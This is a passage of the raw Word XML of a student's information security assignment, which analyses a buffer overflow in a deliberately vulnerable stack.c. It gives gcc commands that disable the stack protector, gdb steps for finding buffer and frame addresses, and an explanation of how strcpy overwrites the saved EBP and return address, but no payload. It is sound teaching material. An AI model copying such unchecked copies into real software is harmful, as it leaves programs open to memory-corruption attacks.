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8551048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AE54894" w14:textId="0F706950" w:rsidR="00F11BB3" w:rsidRDefault="00F11BB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2816C0A5" wp14:editId="0BE9443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91E433C" w14:textId="4AD66C86" w:rsidR="00F11BB3" w:rsidRPr="00800C8E" w:rsidRDefault="00000000" w:rsidP="00800C8E">
          <w:pPr>
            <w:pStyle w:val="NoSpacing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color w:val="4F81BD" w:themeColor="accent1"/>
              <w:sz w:val="56"/>
              <w:szCs w:val="56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4F81BD" w:themeColor="accent1"/>
                <w:sz w:val="52"/>
                <w:szCs w:val="52"/>
              </w:rPr>
              <w:alias w:val="Title"/>
              <w:tag w:val=""/>
              <w:id w:val="1735040861"/>
              <w:placeholder>
                <w:docPart w:val="3608675B61984DDEAF07EE899ED4976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F0B2E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>Information Security assignment</w:t>
              </w:r>
            </w:sdtContent>
          </w:sdt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52"/>
              <w:szCs w:val="52"/>
            </w:rPr>
            <w:alias w:val="Subtitle"/>
            <w:tag w:val=""/>
            <w:id w:val="328029620"/>
            <w:placeholder>
              <w:docPart w:val="25AF04E45A584475AA9AA9411F12198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9063D2C" w14:textId="559438EC" w:rsidR="00F11BB3" w:rsidRDefault="005A4576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 xml:space="preserve">A # </w:t>
              </w:r>
              <w:r w:rsidR="000F0B2E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>0</w:t>
              </w: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>3</w:t>
              </w:r>
            </w:p>
          </w:sdtContent>
        </w:sdt>
        <w:p w14:paraId="6F659BCB" w14:textId="77777777" w:rsidR="00F11BB3" w:rsidRDefault="00F11BB3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EA0C3B" wp14:editId="43E3F3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C897BDD" w14:textId="4614B00F" w:rsidR="00F11BB3" w:rsidRDefault="005A457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September 25, 2025</w:t>
                                    </w:r>
                                  </w:p>
                                </w:sdtContent>
                              </w:sdt>
                              <w:p w14:paraId="51619A2A" w14:textId="3040AA86" w:rsidR="00F11BB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00C8E">
                                      <w:rPr>
                                        <w:caps/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86415AD" w14:textId="4EE0D96E" w:rsidR="00F11BB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00C8E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708699E" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576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  <w:p w14:paraId="373C3E0C" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576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EA0C3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C897BDD" w14:textId="4614B00F" w:rsidR="00F11BB3" w:rsidRDefault="005A457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September 25, 2025</w:t>
                              </w:r>
                            </w:p>
                          </w:sdtContent>
                        </w:sdt>
                        <w:p w14:paraId="51619A2A" w14:textId="3040AA86" w:rsidR="00F11BB3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00C8E">
                                <w:rPr>
                                  <w:caps/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86415AD" w14:textId="4EE0D96E" w:rsidR="00F11BB3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00C8E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708699E" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576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  <w:p w14:paraId="373C3E0C" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576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1B06F455" wp14:editId="74D8303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B6908E" w14:textId="32589E56" w:rsidR="00800C8E" w:rsidRPr="000554C6" w:rsidRDefault="00800C8E" w:rsidP="00800C8E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Name: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Muhammad Faizan Yousaf</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="1FD461EB" w14:textId="145289BB" w:rsidR="00800C8E" w:rsidRPr="000554C6" w:rsidRDefault="00800C8E" w:rsidP="00800C8E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Section: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BCS 7-F</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="41C27517" w14:textId="19394AC1" w:rsidR="00800C8E" w:rsidRDefault="00800C8E" w:rsidP="00800C8E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Roll number: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22F-3875</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="5BC0B846" w14:textId="77777777" w:rsidR="00800C8E" w:rsidRPr="000554C6" w:rsidRDefault="00800C8E" w:rsidP="00800C8E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</w:p>
        <w:p w14:paraId="5C12C0C1" w14:textId="09EF3980" w:rsidR="00800C8E" w:rsidRDefault="00800C8E" w:rsidP="00800C8E"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Submitted to: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Sir Umar Aftab</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="17983C8C" w14:textId="77777777" w:rsidR="00800C8E" w:rsidRDefault="00800C8E"/>
        <w:p w14:paraId="255BE2A6" w14:textId="77777777" w:rsidR="00800C8E" w:rsidRDefault="00800C8E"/>
        <w:p w14:paraId="572E25F8" w14:textId="77777777" w:rsidR="00800C8E" w:rsidRDefault="00800C8E"/>
        <w:p w14:paraId="0BD1FE8A" w14:textId="77777777" w:rsidR="00800C8E" w:rsidRDefault="00800C8E"/>
        <w:p w14:paraId="21883F45" w14:textId="121E9FBF" w:rsidR="00F11BB3" w:rsidRPr="00800C8E" w:rsidRDefault="00000000"/>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="7F4F02F7" w14:textId="6CCCAB44" w:rsidR="00800C8E" w:rsidRDefault="00800C8E"/>
    <w:p w14:paraId="338B2FD1" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576"/>
    <w:p w14:paraId="5DC8E2E5" w14:textId="77777777" w:rsidR="007B7BAC" w:rsidRDefault="007B7BAC"/>
    <w:p w14:paraId="0C99E3F9" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:ind w:left="2160" w:firstLine="720"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Part 1: Buffer Overflow:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CB80EE" w14:textId="77777777" w:rsidR="005A4576" w:rsidRPr="008A0917" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EAC9CC8" w14:textId="723E25CF" w:rsidR="005A4576" w:rsidRPr="008A0917" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Question 1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6750BECD" w14:textId="0A8D09E7" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:r>
        <w:t>Objective: Analyze a provided vulnerable C program (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) that contains a classic stack-based buffer overflow vulnerability. Explain the vulnerability, and draw the stack layout.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A62C620" w14:textId="77777777" w:rsidR="008A0917" w:rsidRPr="008A0917" w:rsidRDefault="008A0917" w:rsidP="008A0917">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Steps:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A577365" w14:textId="77777777" w:rsidR="008A0917" w:rsidRDefault="008A0917" w:rsidP="008A0917">
      <w:r>
        <w:t xml:space="preserve">1. Compile and run the vulnerable program as instructed (example: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>gcc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> -o stack -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>fno</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-stack-protector</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67F2C540" w14:textId="77777777" w:rsidR="008A0917" w:rsidRDefault="008A0917" w:rsidP="008A0917">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>stack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1599B8CC" w14:textId="77777777" w:rsidR="008A0917" w:rsidRDefault="008A0917" w:rsidP="008A0917">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F8E3D8C" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDBDD41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211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-m32 -g -o stack -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>fno</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">-stack-protector </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="33C3FCB4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r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C24310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z w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">cat </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>badfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="37935CBC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stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B595A50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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>gdb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.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/stack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEA6EFB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z w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">break </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>bof</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="45B04456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pacing w:val="-5"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>run</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="163A7714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r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">p </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&amp;buffer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF6F9F4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z w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">info </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>frame</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDFEE9E" w14:textId="77777777" w:rsid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pacing w:val="-2"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00ED615E" w14:textId="7D6C1128" w:rsidR="00C53DF4" w:rsidRPr="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="719"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:spacing w:before="43" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="719" w:hanging="359"/>
        <w:contextualSpacing w:val="0"/>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268400FA" w14:textId="4CEDF884" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Screenshots</w:t>
      </w:r>
      <w:r w:rsidR="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Step 3)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="097D0E34" w14:textId="0BEF04D3" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B98C454" wp14:editId="246C8FF1">
            <wp:extent cx="5486400" cy="4114800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="6343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0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ECD9" w14:textId="7B7A6B9D" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="227F52E8" wp14:editId="6669D0FC">
            <wp:extent cx="5486400" cy="3236595"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:docPr id="5340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3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BD46" w14:textId="71F20A60" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6D84EB99" wp14:editId="5AF0A3E7">
            <wp:extent cx="5486400" cy="3869055"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="16067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D41" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6172B085" w14:textId="69407B97" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:noProof/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69D23AC7" wp14:editId="2F9ADD77">
            <wp:extent cx="5486400" cy="2670175"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="9921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860" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35915F1E" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRPr="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45A4A0A7" w14:textId="11041139" w:rsidR="00C53DF4" w:rsidRPr="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53D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Pr="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2. Create and analyze a stack layout diagram showing saved EIP, saved EBP, return address, and buffer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>offsets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545C3837" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4"/>
    <w:p w14:paraId="6D2FFA2D" w14:textId="050A5FE0" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A0CC932" wp14:editId="578F858A">
            <wp:extent cx="5486400" cy="4600575"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:docPr id="3481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9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0287" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4"/>
    <w:p w14:paraId="2FD1E968" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Answe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE0B822" w14:textId="669337CC" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="00C53D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Pr="00C53DF4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1. Detailed vulnerability analysis and explanation.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22F417FF" w14:textId="73BBE8D9" w:rsidR="00C53DF4" w:rsidRPr="008A0917" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">The flaw in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>stack.c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> lies in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>bof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 xml:space="preserve">) function, which uses </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>strcpy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>) without validating the destination size. Detailed points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0949439E" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRPr="008A0917" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Buffer size mismatch: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>bof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 xml:space="preserve">) allocates buffer with only 12 bytes, while </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>main(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">) reads up to 517 bytes from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>badfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve"> into str. That large str is then passed to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>bof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>) and copied into the much smaller buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB3BDCB" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRPr="008A0917" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t xml:space="preserve">Unsafe </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>strcpy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 xml:space="preserve">): </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>strcpy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>) does not enforce any limit on how many bytes it copies — it continues until it finds a terminating NUL in the source — so it can write past the end of buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C84F3D5" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRPr="008A0917" w:rsidRDefault="00C53DF4" w:rsidP="00C53DF4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008A0917">
        <w:rPr>
          <w:lang w:val="en-AU"/>
        </w:rPr>
        <w:t>Stack corruption: If more than 12 bytes are copied, the overflow will overwrite adjacent stack data, including the saved frame pointer (EBP), the saved return address, and other nearby stack contents.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AB02B8" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="532BC1D2" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19ECEF7E" w14:textId="77777777" w:rsidR="00C53DF4" w:rsidRDefault="00C53DF4" w:rsidP="005A4576">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4182C2A4" w14:textId="77777777" w:rsidR="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:spacing w:before="204"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11DE3B2A" w14:textId="101A9454" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>Question 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A549E27" w14:textId="64325CC1" w:rsidR="005A4576" w:rsidRPr="005A4576" w:rsidRDefault="005A4576" w:rsidP="005A4576">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:spacing w:val="-5"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4576">
        <w:rPr>
          <w:b w:val="0"/>
